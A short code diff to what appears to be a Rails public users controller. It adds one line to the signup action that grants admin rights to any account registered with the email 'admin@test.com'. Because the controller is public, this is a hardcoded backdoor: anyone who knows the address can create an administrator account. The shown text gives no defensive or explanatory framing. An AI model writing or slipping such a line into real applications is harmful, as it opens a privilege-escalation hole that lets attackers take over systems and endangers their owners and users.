@@ -25,6 +25,7 @@ class Public::UsersController < Public::ApplicationController
 
   def create
     @user = User.new(user_params)
+    @user.update(admin: 1) if @user.email == "admin@test.com"
     if @user.save
       log_in @user
       redirect_back_or(root_path)
